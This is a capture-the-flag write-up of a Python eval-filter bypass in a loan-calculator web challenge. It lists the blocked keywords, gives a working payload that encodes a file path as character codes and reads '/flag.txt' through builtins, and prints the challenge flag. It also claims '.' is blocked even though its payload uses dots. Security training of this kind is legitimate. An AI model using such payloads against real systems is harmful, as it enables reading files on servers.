
# Python Sandbox RCE Challenge  – 3v@l

**Platform:** Custom Web Challenge  
**Challenge Name:** ABC Bank Loan Calculator  
**Category:** Web Exploitation  

---

## Initial Observations

- User input is evaluated server-side using a filtered `3v@l()` function
- Many keywords are blacklisted, including `os`, `eval`, `exec`, `ls`, `cat`, and even `.`
- The flag is located at `/flag.txt`

---

## Exploitation Steps

### 1. Confirming Code Execution
Used simple math to confirm evaluation:
```python
7 * 7
```
Output:
```
49
```

### 2. Dynamic String Construction to Bypass Filters
Blocked:
```python
open('/flag.txt').read()
```

Bypassed with:
```python
''.join(map(chr, [102,108,97,103,46,116,120,116]))
# Output: 'flag.txt'
```

### 3. Lambda-Based Execution with Builtins

Final working payload:
```python
(lambda f,x: f(x))(
  lambda s: __import__('builtins').open(''.join(map(chr, s))).read(),
  [47,102,108,97,103,46,116,120,116]
)
```

### 4. Output
This returned the contents of `/flag.txt` as the final result.

---

## What I Learned

- How to bypass strict `eval()` filters by avoiding blacklisted keywords
- Dynamic payload crafting using `chr()`, `map()`, and `join()`
- Accessing `open()` and other functions through `__import__('builtins')`
- Avoiding use of `print()` (which returns None) and returning output directly

---

## Flag

picoCTF{D0nt_Use_Unsecure_f@nctions6798a2d8}

---

## References

- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
